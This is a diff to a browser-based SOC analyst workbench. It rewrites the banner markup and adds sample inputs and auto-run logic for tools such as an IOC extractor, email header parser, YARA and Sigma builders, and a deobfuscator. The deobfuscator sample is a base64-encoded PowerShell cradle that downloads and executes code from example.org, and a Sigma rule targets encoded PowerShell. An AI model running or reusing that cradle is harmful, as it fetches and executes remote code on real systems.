@@ -58,7 +58,7 @@ report:F("rep-id","Incident ID","INC-2026-001")+F("rep-title","Title","Suspiciou
 cvss:S("cv-av","Attack Vector",[["N","Network (N)"],["A","Adjacent (A)"],["L","Local (L)"],["P","Physical (P)"]])+S("cv-ac","Attack Complexity",[["L","Low (L)"],["H","High (H)"]])+S("cv-pr","Privileges Required",[["N","None (N)"],["L","Low (L)"],["H","High (H)"]])+S("cv-ui","User Interaction",[["N","None (N)"],["R","Required (R)"]])+S("cv-s","Scope",[["U","Unchanged (U)"],["C","Changed (C)"]])+'<div class="psv-form-grid">'+["c","i","a"].map(function(k){return S("cv-"+k,k.toUpperCase()+" impact",[["N","None (N)"],["L","Low (L)"],["H","High (H)"]])}).join("")+'</div>'+B("Calculate CVSS v3.1")+O()
 };
 var app=$("#psv-tools-app");if(!app)return;
-app.innerHTML='<div class="psv-console"><div class="psv-console-top"><span class="psv-live-dot"></span><span>LOCAL PROCESSING</span><span class="psv-console-spacer"></span><span id="psv-clock"></span><button id="psv-theme" class="psv-theme-btn" type="button">☼ Toggle theme</button></div><header class="psv-hero"><div class="psv-eyebrow">PRIVACY SKILL VAULT / SECURITY TOOLS</div><h1>Security operations.<br><span>At your fingertips.</span></h1><p>Browser-based utilities for SOC analysts, incident responders and detection engineers. Your text stays local unless you deliberately open an external lookup.</p><div class="psv-hero-stats"><span><b>13</b> utilities</span><span><b>0</b> required accounts</span><span><b>Local</b> by default</span></div></header><div class="psv-search-wrap"><input id="psv-search" type="search" placeholder="Search tools, workflows, indicators…" aria-label="Search tools"><span class="psv-shortcut">FILTER</span></div><nav id="psv-tool-grid" class="psv-tool-grid" aria-label="Available tools">'+defs.map(function(t,i){return '<button class="psv-tool-card" data-tool="'+t[0]+'"><span class="psv-tool-index">'+String(i+1).padStart(2,"0")+'</span><span class="psv-tool-title">'+t[1]+'</span><span class="psv-tool-desc">'+t[2]+'</span><span class="psv-tool-open">Open workspace ↗</span></button>'}).join("")+'</nav><div id="psv-workspace">'+defs.map(function(t){return panel(t[0],t[1],t[2],bodies[t[0]])}).join("")+'</div><footer class="psv-footnote"><span>PSV / CLIENT-SIDE WORKBENCH</span><span>Verify outputs before operational use.</span></footer><div id="psv-toast" class="psv-toast" role="status"></div></div>';
+app.innerHTML='<div class="psv-console"><header class="psv-hero"><div class="psv-eyebrow">SECURITY OPERATIONS WORKBENCH</div><h1>Analyze. Detect.<br><span>Investigate.</span></h1><p>The Tools section brings together practical SOC utilities, indicator enrichment, log decoders, and detection engineering workbenches used to turn raw telemetry into actionable security investigations.</p></header><div class="psv-search-wrap"><input id="psv-search" type="search" placeholder="Search tools, workflows, indicators…" aria-label="Search tools"><span class="psv-shortcut">FILTER</span></div><nav id="psv-tool-grid" class="psv-tool-grid" aria-label="Available tools">'+defs.map(function(t,i){return '<button class="psv-tool-card" data-tool="'+t[0]+'"><span class="psv-tool-index">'+String(i+1).padStart(2,"0")+'</span><span class="psv-tool-title">'+t[1]+'</span><span class="psv-tool-desc">'+t[2]+'</span><span class="psv-tool-open">Open workspace ↗</span></button>'}).join("")+'</nav><div id="psv-workspace">'+defs.map(function(t){return panel(t[0],t[1],t[2],bodies[t[0]])}).join("")+'</div><div id="psv-toast" class="psv-toast" role="status"></div></div>';
 var get=function(id){return ($("#"+id)?.value||"").trim()}, out=function(s){var e=$("#out");if(e)e.textContent=s}, toast=function(s){var e=$("#psv-toast");e.textContent=s;e.classList.add("show");setTimeout(function(){e.classList.remove("show")},2200)};
 var back=function(){$$(".psv-tool-panel").forEach(function(p){p.hidden=true});$("#psv-tool-grid").hidden=false;$(".psv-search-wrap").hidden=false};
 var show=function(id){$("#psv-tool-grid").hidden=true;$(".psv-search-wrap").hidden=true;$$(".psv-tool-panel").forEach(function(p){p.hidden=p.id!=="panel-"+id});if(id==="events")renderEvents();window.scrollTo({top:0,behavior:"smooth"})};
@@ -328,4 +328,48 @@ function installIntel(panel){
 }
 if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",init,{once:true});else init();
 if(window.document$?.subscribe)window.document$.subscribe(()=>init());
+})();
+
+/* PSV UI and reliable sample/render lifecycle fixes. */
+(function(){
+"use strict";
+const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>Array.from(r.querySelectorAll(s));
+const samples={
+ioc:{"ioc-input":"Failed logon source=203.0.113.42 domain=example.org URL=https://example.org/login SHA256=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef defanged=hxxps://malicious[.]example/path MD5=d41d8cd98f00b204e9800998ecf8427e"},
+intel:{"intel-indicator":"8.8.8.8"},
+email:{"email-input":"From: security@example.org\nReply-To: attacker@example.net\nReturn-Path: <bounce@example.org>\nDate: Sat, 17 Oct 2026 12:00:00 +0300\nSubject: Suspicious sign-in alert\nReceived: from relay.example.net (relay.example.net [203.0.113.42]) by mx.example.org; Sat, 17 Oct 2026 09:00:01 +0000\nReceived: from workstation.example.org ([198.51.100.25]) by relay.example.net; Sat, 17 Oct 2026 09:00:00 +0000\nAuthentication-Results: mx.example.org; spf=fail; dkim=none; dmarc=fail"},
+siem:{"siem-kind":"sigma","siem-fields":"title: Suspicious PowerShell\nlogsource:\n  product: windows\ndetection:\n  selection:\n    EventID: 4688\n    CommandLine|contains: -enc\n  condition: selection"},
+events:{"event-search":"4625"},regex:{"regex-pattern":"failed.*logon","regex-flags":"gi","regex-text":"Failed logon user=alice src=203.0.113.42\nSuccessful logon user=bob"},
+yara:{"yara-name":"Suspicious_PE_Sample","yara-strings":"MZ\nThis program cannot be run in DOS mode","yara-condition":"any"},
+deob:{"deob-input":"SW52b2tlLUV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZXhhbXBsZS5vcmcvYScp","deob-mode":"base64"},
+json:{"json-input":'{"event":{"id":4625,"provider":"Microsoft-Windows-Security-Auditing"},"source":{"ip":"203.0.113.42"},"user":{"name":"alice"}}'},
+time:{"time-input":"2026-10-17T09:30:00Z","time-zone":"Asia/Riyadh"},
+severity:{"sev-impact":"2","sev-scope":"1","sev-confidence":"2","sev-exposure":"2"},
+report:{"rep-id":"INC-DEMO-001","rep-title":"Suspicious authentication activity","rep-date":"2026-10-17T12:30:00+03:00","rep-sev":"High","rep-summary":"Repeated failed logons were observed from a test source. Impact is under investigation.","rep-evidence":"Event ID 4625; source 203.0.113.42; timestamp normalized to UTC.","rep-actions":"Validate account ownership, preserve relevant logs, block only under approved response procedures."},
+cvss:{"cv-av":"N","cv-ac":"L","cv-pr":"N","cv-ui":"N","cv-s":"U","cv-c":"H","cv-i":"H","cv-a":"H"}
+};
+function renderSample(panel){
+ const id=panel.id.replace("panel-","");
+ Object.entries(samples[id]||{}).forEach(([key,value])=>{const el=$("#"+key,panel);if(el){el.value=value;el.dispatchEvent(new Event("input",{bubbles:true}));}});
+ if(id==="events"){const s=$("#event-search",panel);if(s)s.dispatchEvent(new Event("input",{bubbles:true}));return;}
+ if(id==="intel"){const b=Array.from(panel.querySelectorAll("button")).find(x=>/analyze indicator|prepare lookup links/i.test(x.textContent));if(b)b.click();return;}
+ const run=$('button[data-action="run"]',panel);if(run)run.click();
+}
+document.addEventListener("click",e=>{const sample=e.target.closest("button[data-psv-sample]");if(sample){const panel=sample.closest(".psv-tool-panel");if(panel){e.preventDefault();e.stopImmediatePropagation();renderSample(panel);}}},true);
+document.addEventListener("input",e=>{
+ const panel=e.target.closest(".psv-tool-panel");if(!panel||!e.target.matches("input,textarea,select")||e.target.matches("#event-search"))return;
+ const id=panel.id.replace("panel-","");if(id==="intel")return;
+ const run=$('button[data-action="run"]',panel);
+ if(run&&["ioc","email","siem","regex","yara","deob","json","time","severity","report","cvss"].includes(id))run.click();
+},true);
+function init(){
+ const app=$("#psv-tools-app");if(!app||app.dataset.psvFinalFix==="1")return;app.dataset.psvFinalFix="1";
+ $$(".psv-console-top,.psv-hero-stats,.psv-footnote,.psv-app-footer",app).forEach(el=>el.remove());
+ const eyebrow=$(".psv-hero .psv-eyebrow",app);if(eyebrow)eyebrow.textContent="SECURITY OPERATIONS WORKBENCH";
+ const h=$(".psv-hero h1",app);if(h)h.innerHTML='Analyze. Detect.<br><span>Investigate.</span>';
+ const p=$(".psv-hero p",app);if(p)p.textContent="The Tools section brings together practical SOC utilities, indicator enrichment, log decoders, and detection engineering workbenches used to turn raw telemetry into actionable security investigations.";
+ const first=$("#panel-ioc",app);if(first){first.hidden=false;const input=$("#ioc-input",first);if(input)input.value=samples.ioc["ioc-input"];const run=$('button[data-action="run"]',first);if(run)run.click();}
+}
+if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",init,{once:true});else init();
+if(window.document$?.subscribe)window.document$.subscribe(init);
 })();
